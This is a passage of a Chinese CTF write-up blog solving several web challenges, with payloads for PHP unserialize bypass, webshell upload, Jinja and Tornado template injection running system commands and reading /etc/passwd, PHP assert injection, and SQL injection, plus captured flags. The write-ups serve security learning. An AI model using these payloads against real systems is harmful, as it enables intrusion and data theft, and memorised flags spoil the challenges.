<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">s0 &#x3D; &quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span><br><span class="line">def rot13_decode(c):</span><br><span class="line">	if ord(c)&gt;&#x3D;ord(&#39;a&#39;) and ord(c)&lt;&#x3D;ord(&#39;z&#39;):</span><br><span class="line">		return chr((ord(c)-ord(&#39;a&#39;)+13) % 26 + ord(&#39;a&#39;))</span><br><span class="line">	elif ord(c)&gt;&#x3D;ord(&#39;A&#39;) and ord(c)&lt;&#x3D;ord(&#39;Z&#39;):</span><br><span class="line">		return chr((ord(c)-ord(&#39;A&#39;)+13) % 26 + ord(&#39;A&#39;))</span><br><span class="line">	else:</span><br><span class="line">		return c</span><br><span class="line"></span><br><span class="line">def decodeM(s0):</span><br><span class="line">	s1 &#x3D; &quot;&quot;</span><br><span class="line">	for s in s0:</span><br><span class="line">		s1 +&#x3D; rot13_decode(s)</span><br><span class="line">		# print(s1)</span><br><span class="line">	print(type(s1))</span><br><span class="line">	s1 &#x3D; s1[::-1] # 这里很关键</span><br><span class="line">	s1&#x3D;base64.b64decode(s1)</span><br><span class="line">	s1&#x3D;str(s1,&#39;utf-8&#39;) #这里很关键</span><br><span class="line">	s2&#x3D;&quot;&quot;</span><br><span class="line">	for s in s1:</span><br><span class="line">		s2 +&#x3D; chr(ord(s) - 1)</span><br><span class="line">	s2&#x3D;s2[::-1]</span><br><span class="line">	print(s2)</span><br><span class="line"></span><br><span class="line">decodeM(s0)</span><br></pre></td></tr></table></figure>
<p>日了刚开始密文用str定义，死活写不出来</p>
<p>也可以用php直接写，也比较方便。略过。</p>
<h2 id="php2"><a href="#php2" class="headerlink" title="php2"></a>php2</h2><p>使用御剑扫描，只有一个index.php</p>
<p>根据wp，访问phps，得到php源码</p>
<p>阅读源码，发现通过id传入admin即可</p>
<p>考虑到上传时自动操作urldecode一次，php源码中urlcode一次，则对admin进行两次urlencode加密</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:42773&#x2F;index.php?id&#x3D;%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65</span><br></pre></td></tr></table></figure>
<p>注意此处，id=admin而不是”admin”</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;007cac75ed0e33c3a695f2e87b4da112&#125;</span><br></pre></td></tr></table></figure>
<h2 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h2><p>访问地址，得到php源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class xctf&#123;</span><br><span class="line">public $flag &#x3D; &#39;111&#39;;</span><br><span class="line">public function __wakeup()&#123;</span><br><span class="line">exit(&#39;bad requests&#39;);</span><br><span class="line">&#125;</span><br><span class="line">?code&#x3D;</span><br></pre></td></tr></table></figure>
<p>根据题目名unserialize3和源码中出现的__wakeup函数，判断需要生成一个xctf的对象，然后将其序列化后赋值给code</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>根据wp，此处利用一个wakeup漏洞，即序列化字符串中属性个数大于真实属性个数时，会跳过wakeup的执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:47562&#x2F;index.php?code&#x3D;O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;e51c4424e28d385283c0deb1601cc47b&#125;</span><br></pre></td></tr></table></figure>
<h2 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h2><p>本题为文件上传</p>
<p>尝试上传一个php一句话木马，一选定文件，即弹框“请上传图片”。判断前端js做了后缀过滤，在firefox中把js禁掉</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">about:config</span><br><span class="line">搜索javascript:enabled，切换为false</span><br></pre></td></tr></table></figure>
<p>上传一个图片，发现会给出图片的地址。</p>
<p>尝试上传图片木马，失败。</p>
<p>直接上传php一句话木马，成功。使用菜刀链接后，可以找到flag.php文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;004bd6dd9c980a3ac47e680645f88133&#125;</span><br></pre></td></tr></table></figure>


<h2 id="web-python-template-injection"><a href="#web-python-template-injection" class="headerlink" title="web_python_template_injection"></a>web_python_template_injection</h2><p>题目提示是模板注入SSTI</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:59244&#x2F;&#123;&#123;1+2&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>1+2执行了，存在SSTI。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:59244&#x2F;%7B%7B&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)%7D%7D</span><br></pre></td></tr></table></figure>
<p>得知fl4g为flag所在地</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:59244&#x2F;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;cat fl4g&#39;).read() &#125;&#125;</span><br><span class="line">或者</span><br><span class="line">&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;fl4g&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>


<h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><p>学习<a target="_blank" rel="noopener" href="https://www.freebuf.com/column/187845.html">https://www.freebuf.com/column/187845.html</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">模板注入一般指flask下jinja模板引擎的注入，&#123;&#123;&#125;&#125;是变量包裹标识符，可以传递变量，可以执行简单表达式</span><br></pre></td></tr></table></figure>

<h4 id="判断是否有SSTI"><a href="#判断是否有SSTI" class="headerlink" title="判断是否有SSTI"></a>判断是否有SSTI</h4><p>在URL末尾添加，3观察表达式是否执行</p>
<h4 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__class__  返回类型所属的对象</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回该对象所继承的基类</span><br><span class="line">&#x2F;&#x2F; __base__和__mro__都是用来寻找基类的</span><br><span class="line"></span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure>
<h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__ # 获取字符串类对象</span><br><span class="line">&#39;&#39;.__class__.__mro__ # 寻找基类</span><br><span class="line">&#39;&#39;.__class__.__mro__[2].subclasses__ # 寻找可用引用，其中type为file的可用</span><br><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() # 第40个引用为file类型，可用于读取文件</span><br><span class="line"></span><br><span class="line">for item in &#39;&#39;.__class__.__mro__[2].__subclasses__():</span><br><span class="line">    try:</span><br><span class="line">         if &#39;os&#39; in item.__init__.__globals__: # 寻找包括os的引用，一般为71 &lt;class &#39;site._Printer&#39;&gt;</span><br><span class="line">             print num,item</span><br><span class="line">         num+&#x3D;1</span><br><span class="line">    except:</span><br><span class="line">        print &#39;-&#39;</span><br><span class="line">        num+&#x3D;1</span><br><span class="line"></span><br><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</span><br></pre></td></tr></table></figure>


<h2 id="easytornado"><a href="#easytornado" class="headerlink" title="easytornado"></a>easytornado</h2><p>观察URL，发现URL由filename和filehash构成</p>
<p>打开网页有三个文件flag.txt，welcome.txt，hints.txt，分别打开后得知flag在/fllllllllllllag下，filehash=md5(cookie_secret+md5(filename))。</p>
<p>根据wp，tornado框架下的cookie_secret在handler.settings中可以查看，通过SSTI查看</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:42386&#x2F;error?msg&#x3D;&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>根据公式计算filehash</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;fllllllllllllag   3bf9f6cf685a6dd8defadabfb41a03a1</span><br><span class="line">&#39;cookie_secret&#39;: &#39;e8e46546-9657-4f0c-9838-ac21f21f13cf&#39;</span><br><span class="line"></span><br><span class="line">1a87b4db9ccdf43a09e252f25982e4a3</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3f39aea39db345769397ae895edb9c70&#125;</span><br></pre></td></tr></table></figure>
<h2 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a>shrine</h2><p>打开题目后阅读源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>) </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>) </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span> </span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">open</span>(__file__).read() </span><br><span class="line">	</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&#x27;</span></span>) </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span>(<span class="params">shrine</span>):</span> </span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span> </span><br><span class="line">		s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>) </span><br><span class="line">		blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>] </span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s </span><br><span class="line">	<span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine)) </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>由关键词flask和jinja，判断是一道SSTI题</p>
<p>可以得知FLAG在config中</p>
<p>代码对SSTI注入的参数进行了两种过滤</p>
<ol>
<li>删除左括号(和右括号)</li>
<li>将变量config和self的值设置为None，简单来说就是不能直接访问config和self变量</li>
</ol>
<p>payload可以是下面任意一种</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;shrine&#x2F;&#123;&#123;url_for.__globals__[&quot;current_app&quot;].config&#125;&#125;</span><br><span class="line">&#x2F;shrine&#x2F;&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;shrine_is_good_ssti&#125;</span><br></pre></td></tr></table></figure>
<h3 id="SSTI常见内置函数和变量（flask）"><a href="#SSTI常见内置函数和变量（flask）" class="headerlink" title="SSTI常见内置函数和变量（flask）"></a>SSTI常见内置函数和变量（flask）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">config</span><br><span class="line">　　config 对象就是Flask的config对象，也就是 app.config 对象</span><br><span class="line">request</span><br><span class="line">　　Flask中代表当前请求的request对象</span><br><span class="line">session</span><br><span class="line">　　Flask的session对象</span><br><span class="line">url_for()</span><br><span class="line">　　url_for会根据传入的路由器函数名,返回该路由对应的URL,在模板中始终使用url_for()就可以安全的修改路由绑定的URL,则不比担心模板中渲染出错的链接</span><br><span class="line">get_flashed_messages()</span><br><span class="line">　　这个函数会返回之前在flask中通过flask()传入的消息的列表，flash函数的作用很简单,可以把由Python字符串表示的消息加入一个消息队列中，再使用get_flashed_message()函数取出它们并消费掉</span><br></pre></td></tr></table></figure>
<h2 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h2><p>首先打开网页，发现有三个可以点击的地方，都试试之后，观察URL为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:31715&#x2F;?page&#x3D;home</span><br></pre></td></tr></table></figure>
<p>形式。</p>
<p>根据wp，在about中提示使用了git，可以存在git泄露，于是访问</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:31715&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure>
<p>可以进入templates</p>
<p>使用githack.py进行下载，得到文件。存在flag文件，但是直接打开后没有东西，可能在下载时做了一些过滤。打开index.php文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;page&#39;])) &#123;</span><br><span class="line">	$page &#x3D; $_GET[&#39;page&#39;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	$page &#x3D; &quot;home&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file &#x3D; &quot;templates&#x2F;&quot; . $page . &quot;.php&quot;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; I heard &#39;..&#39; is dangerous!</span><br><span class="line">assert(&quot;strpos(&#39;$file&#39;, &#39;..&#39;) &#x3D;&#x3D;&#x3D; false&quot;) or die(&quot;Detected hacking attempt!&quot;); # 此处是关键</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; TODO: Make this look nice</span><br><span class="line">assert(&quot;file_exists(&#39;$file&#39;)&quot;) or die(&quot;That file doesn&#39;t exist!&quot;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">		&lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;</span><br><span class="line">		&lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;title&gt;My PHP Website&lt;&#x2F;title&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;twitter-bootstrap&#x2F;3.3.7&#x2F;css&#x2F;bootstrap.min.css&quot; &#x2F;&gt;</span><br><span class="line">	&lt;&#x2F;head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;nav class&#x3D;&quot;navbar navbar-inverse navbar-fixed-top&quot;&gt;</span><br><span class="line">			&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">		    	&lt;div class&#x3D;&quot;navbar-header&quot;&gt;</span><br><span class="line">		    		&lt;button type&#x3D;&quot;button&quot; class&#x3D;&quot;navbar-toggle collapsed&quot; data-toggle&#x3D;&quot;collapse&quot; data-target&#x3D;&quot;#navbar&quot; aria-expanded&#x3D;&quot;false&quot; aria-controls&#x3D;&quot;navbar&quot;&gt;</span><br><span class="line">		            	&lt;span class&#x3D;&quot;sr-only&quot;&gt;Toggle navigation&lt;&#x2F;span&gt;</span><br><span class="line">		            	&lt;span class&#x3D;&quot;icon-bar&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">		            	&lt;span class&#x3D;&quot;icon-bar&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">		            	&lt;span class&#x3D;&quot;icon-bar&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">		          	&lt;&#x2F;button&gt;</span><br><span class="line">		          	&lt;a class&#x3D;&quot;navbar-brand&quot; href&#x3D;&quot;#&quot;&gt;Project name&lt;&#x2F;a&gt;</span><br><span class="line">		        &lt;&#x2F;div&gt;</span><br><span class="line">		        &lt;div id&#x3D;&quot;navbar&quot; class&#x3D;&quot;collapse navbar-collapse&quot;&gt;</span><br><span class="line">		          	&lt;ul class&#x3D;&quot;nav navbar-nav&quot;&gt;</span><br><span class="line">		            	&lt;li &lt;?php if ($page &#x3D;&#x3D; &quot;home&quot;) &#123; ?&gt;class&#x3D;&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href&#x3D;&quot;?page&#x3D;home&quot;&gt;Home&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">		            	&lt;li &lt;?php if ($page &#x3D;&#x3D; &quot;about&quot;) &#123; ?&gt;class&#x3D;&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href&#x3D;&quot;?page&#x3D;about&quot;&gt;About&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">		            	&lt;li &lt;?php if ($page &#x3D;&#x3D; &quot;contact&quot;) &#123; ?&gt;class&#x3D;&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href&#x3D;&quot;?page&#x3D;contact&quot;&gt;Contact&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">						&lt;!--&lt;li &lt;?php if ($page &#x3D;&#x3D; &quot;flag&quot;) &#123; ?&gt;class&#x3D;&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href&#x3D;&quot;?page&#x3D;flag&quot;&gt;My secrets&lt;&#x2F;a&gt;&lt;&#x2F;li&gt; --&gt;</span><br><span class="line">		          	&lt;&#x2F;ul&gt;</span><br><span class="line">		        &lt;&#x2F;div&gt;</span><br><span class="line">		    &lt;&#x2F;div&gt;</span><br><span class="line">		&lt;&#x2F;nav&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;div class&#x3D;&quot;container&quot; style&#x3D;&quot;margin-top: 50px&quot;&gt;</span><br><span class="line">			&lt;?php</span><br><span class="line">				require_once $file;</span><br><span class="line">			?&gt;</span><br><span class="line">			</span><br><span class="line">		&lt;&#x2F;div&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;jquery&#x2F;1.12.4&#x2F;jquery.min.js&quot; &#x2F;&gt;</span><br><span class="line">		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;twitter-bootstrap&#x2F;3.3.7&#x2F;js&#x2F;bootstrap.min.js&quot; &#x2F;&gt;</span><br><span class="line">	&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<p>$file处是由page直接拼接成的，没有做过滤，此处可以注入</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page&#x3D;abc&#39;) or system(&quot;cat templates&#x2F;flag.php&quot;);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;685f2fb4f05573221e5a84e0849fe433&#125;</span><br></pre></td></tr></table></figure>
<h2 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h2><p>考察：sql注入、SSRF、反序列化</p>
<p>打开网页，首先把整个注册登录流程走一遍。</p>
<p>注册用户后，进入登录界面，发现URL为此格式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:30590&#x2F;view.php?no&#x3D;1</span><br></pre></td></tr></table></figure>
<p>考虑sql注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:30590&#x2F;view.php?no&#x3D;1 and 1&#x3D;1 # 成功</span><br><span class="line">http:&#x2F;&#x2F;220.249.52.134:30590&#x2F;view.php?no&#x3D;1 and 1&#x3D;2 # 失败</span><br></pre></td></tr></table></figure>
<p>故存在注入点</p>
<h3 id="手工注入-1"><a href="#手工注入-1" class="headerlink" title="手工注入"></a>手工注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查看返回列个数 &#x2F;view.php?no&#x3D;1 order by 4</span><br><span class="line">爆列名 &#x2F;view.php?no&#x3D;1 and updatexml(1,make_set(3,&#39;~&#39;,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;users&quot;)),1)#</span><br><span class="line">爆字段 &#x2F;view.php?no&#x3D;1 and updatexml(1,make_set(3,&#39;~&#39;,(select data from users)),1)#</span><br></pre></td></tr></table></figure>
<p>返回这一串东西</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:5:&quot;1.com&quot;;&#125; </span><br></pre></td></tr></table></figure>
<h3 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u http:&#x2F;&#x2F;220.249.52.134:30590&#x2F;view.php?no&#x3D;1 --batch </span><br></pre></td></tr></table></figure>
<p>不知道为什么，在时间注入那卡死了，跳过。</p>
<p>访问/robots.txt，发现存在备份文件/user.php.bak</p>
<p>访问/user.php.bak</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span 